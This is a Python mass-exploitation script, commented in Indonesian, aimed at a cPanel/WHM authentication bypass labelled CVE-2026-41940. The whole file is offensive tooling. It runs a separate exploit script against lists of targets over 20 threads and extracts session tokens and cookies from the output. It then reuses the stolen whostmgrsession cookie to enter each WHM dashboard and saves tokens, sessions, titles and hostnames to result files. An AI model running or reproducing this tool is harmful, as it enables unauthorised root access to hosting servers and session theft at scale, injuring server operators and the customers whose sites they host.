#!/usr/bin/env python3
# Mass Exploit for cPanel/WHM Auth Bypass (CVE-2026-41940)
# Supports: 2087 (WHM) + 2083 (cPanel)
# Tambahan: Ekstrak token & session SEMUA target, ambil title dashboard & hostname

import subprocess
import sys
import threading
import time
import os
import re
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║     cPanel/WHM Auth Bypass Mass Exploit (CVE-2026-41940)                     ║
║     PORTS: 2087 (WHM) + EKSTRAK TOKEN & CEK TITLE DASHBOARD                ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
print(banner)

# KONFIGURASI
THREADS = 20
TIMEOUT = 45
ORIGINAL_SCRIPT = "cpanel_exploit.py"  # Nama file exploit asli
OUTPUT_SUCCESS = "success.txt"
OUTPUT_FAILED = "failed.txt"
OUTPUT_ALL = "all_results.txt"
OUTPUT_TITLE = "whm_titles.txt"
OUTPUT_HOSTNAME = "hostnames.txt"  # Baru: untuk simpan hostname

DEFAULT_PORTS = [2087]

# ========== FUNGSI TAMBAHAN ==========
def extract_token_and_session(output_text):
    """Ekstrak token dan session dari output exploit"""
    token_match = re.search(r'token = /cpsess(\d+)', output_text)
    session_match = re.search(r'session base = :(\S+)', output_text)

    token = token_match.group(1) if token_match else None
    session = session_match.group(1) if session_match else None
    return token, session

def get_whm_dashboard_title(target_url, token, session):
    """Akses WHM dashboard dengan cookie dan ambil title"""
    if not token or not session:
        return None

    dashboard_url = f"{target_url.rstrip('/')}/cpsess{token}/"
    cookies = {'whostmgrsession': f':{session}'}

    try:
        resp = requests.get(dashboard_url, cookies=cookies, verify=False, timeout=15,
                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()
        return None
    except Exception as e:
        return None

def extract_hostname_from_output(output_text):
    """Ambil hostname dari output exploit (misal: server.narmada.my.id)"""
    hostname_match = re.search(r'hostname = (.+)', output_text)
    if hostname_match:
        return hostname_match.group(1).strip()
    return ""
# ========== END FUNGSI TAMBAHAN ==========

def prepare_target(target):
    """Siapkan target dengan format yang benar (default port 2087)"""
    target = target.strip()
    if not target:
        return None

    if target.startswith("http://"):
        target = target.replace("http://", "")
    if target.startswith("https://"):
        target = target.replace("https://", "")

    target = target.rstrip("/")

    if ":" in target:
        host, port = target.split(":")
        return f"https://{host}:{port}"
    else:
        return [f"https://{target}:{port}" for port in DEFAULT_PORTS]

def run_single_exploit(target_url, idx, total):
    """Jalankan exploit untuk 1 target"""

    cmd = ["python3", ORIGINAL_SCRIPT, "--target", target_url]
    tmp_out = f"/tmp/cpwhmauthbypass2_{idx}.out"
    tmp_err = f"/tmp/cpwhmauthbypass2_{idx}.err"

    try:
        with open(tmp_out, "w") as out, open(tmp_err, "w") as err:
            subprocess.run(cmd, stdout=out, stderr=err, timeout=TIMEOUT, text=True)

        with open(tmp_out, "r") as f:
            output = f.read()

        # ========== EKSTRAKSI TOKEN & SESSION ==========
        token, session = extract_token_and_session(output)

        dashboard_title = None
        if token and session:
            dashboard_title = get_whm_dashboard_title(target_url, token, session)
            # SIMPAN KE FILE TITLE
            with open(OUTPUT_TITLE, "a") as ft:
                ft.write(f"{target_url}|TOKEN={token}|SESSION={session}|TITLE={dashboard_title}\n")
        
        # ========== TAMBAHAN: Ambil hostname ==========
        hostname = extract_hostname_from_output(output)
        if hostname:
            with open(OUTPUT_HOSTNAME, "a") as fh:
                fh.write(f"{target_url}|{hostname}\n")
        # ========== END TAMBAHAN ==========

        # ========== LOGIKA ASLI (SUKSES/GAGAL) ==========
        if "now just login" in output.lower() or "verified we're whm root" in output.lower():
            with open(OUTPUT_SUCCESS, "a") as fs:
                fs.write(f"{target_url}|SUCCESS\n")
            with open(OUTPUT_ALL, "a") as fa:
                fa.write(f"{target_url}|SUCCESS\n")
            print(f"✅ [{idx}/{total}] SUCCESS: {target_url} | DASHBOARD TITLE: {dashboard_title}")
            return True
        else:
            with open(OUTPUT_FAILED, "a") as ff:
                ff.write(f"{target_url}|FAILED\n")
            with open(OUTPUT_ALL, "a") as fa:
                fa.write(f"{target_url}|FAILED\n")
            if dashboard_title:
                print(f"❌ [{idx}/{total}] FAILED (but token extracted): {target_url} | DASHBOARD TITLE: {dashboard_title}")
            else:
                print(f"❌ [{idx}/{total}] FAILED: {target_url}")
            return False
        # ========== END LOGIKA ASLI ==========

    except subprocess.TimeoutExpired:
        print(f"⏰ [{idx}/{total}] TIMEOUT: {target_url}")
        with open(OUTPUT_FAILED, "a") as f:
            f.write(f"{target_url}|TIMEOUT\n")
        with open(OUTPUT_ALL, "a") as f:
            f.write(f"{target_url}|TIMEOUT\n")
        return False
    except Exception as e:
        print(f"⚠️ [{idx}/{total}] ERROR: {target_url} - {e}")
        return False
    finally:
        for f in [tmp_out, tmp_err]:
            if os.path.exists(f):
                os.remove(f)

def load_targets(file_path):
    """Load targets dari file"""
    targets = []
    with open(file_path, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                result = prepare_target(line)
                if result:
                    if isinstance(result, list):
                        targets.extend(result)
                    else:
                        targets.append(result)
    return targets

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  python3 {sys.argv[0]} --file <targets.txt>")
        print(f"  python3 {sys.argv[0]} --single <target.com>")
        print(f"  python3 {sys.argv[0]} --list <target1> <target2> <target3>")
        print("\nContoh file targets.txt:")
        print("  example.com")
        print("  192.168.1.100")
        print("  https://server.com:2087")
        print("  server.com:2083")
        sys.exit(1)

    if sys.argv[1] == "--file":
        targets = load_targets(sys.argv[2])
    elif sys.argv[1] == "--single":
        result = prepare_target(sys.argv[2])
        targets = result if isinstance(result, list) else [result]
    elif sys.argv[1] == "--list":
        targets = []
        for t in sys.argv[2:]:
            result = prepare_target(t)
            if isinstance(result, list):
                targets.extend(result)
            else:
                targets.append(result)
    else:
        print("Unknown option!")
        sys.exit(1)

    targets = [t for t in targets if t]

    if not targets:
        print("[!] No valid targets found!")
        sys.exit(1)

    # Clear output files
    for f in [OUTPUT_SUCCESS, OUTPUT_FAILED, OUTPUT_ALL, OUTPUT_TITLE, OUTPUT_HOSTNAME]:
        open(f, "w").close()

    total = len(targets)
    print(f"[*] Loaded {total} targets")
    print(f"[*] Threads: {THREADS}")
    print(f"[*] Timeout: {TIMEOUT}s per target")
    print(f"[*] Original script: {ORIGINAL_SCRIPT}")
    print(f"[*] Ports: {DEFAULT_PORTS}")
    print(f"[*] Output files: {OUTPUT_SUCCESS}, {OUTPUT_FAILED}, {OUTPUT_ALL}, {OUTPUT_TITLE}, {OUTPUT_HOSTNAME}")
    print("\n" + "="*60)
    print("STARTING MASS EXPLOITATION...")
    print("="*60 + "\n")

    start_time = time.time()
    success_count = 0

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {}
        idx = 0
        for target in targets:
            idx += 1
            future = executor.submit(run_single_exploit, target, idx, total)
            futures[future] = target

        for future in as_completed(futures):
            if future.result():
                success_count += 1

    elapsed = time.time() - start_time

    print("\n" + "="*60)
    print("MASS EXPLOITATION COMPLETED!")
    print("="*60)
    print(f"📊 Total targets: {total}")
    print(f"✅ Success: {success_count}")
    print(f"❌ Failed: {total - success_count}")
    print(f"⏱️  Time taken: {elapsed:.2f} seconds")
    print(f"\n📁 Results saved to:")
    print(f"   - {OUTPUT_SUCCESS} (successful targets)")
    print(f"   - {OUTPUT_FAILED} (failed targets)")
    print(f"   - {OUTPUT_ALL} (all targets)")
    print(f"   - {OUTPUT_TITLE} (dashboard titles with token/session)")
    print(f"   - {OUTPUT_HOSTNAME} (hostnames)")

    if success_count > 0:
        print(f"\n🔥 SUCCESSFUL TARGETS:")
        with open(OUTPUT_SUCCESS, "r") as f:
            for line in f:
                print(f"   {line.strip()}")

if __name__ == "__main__":
    main()
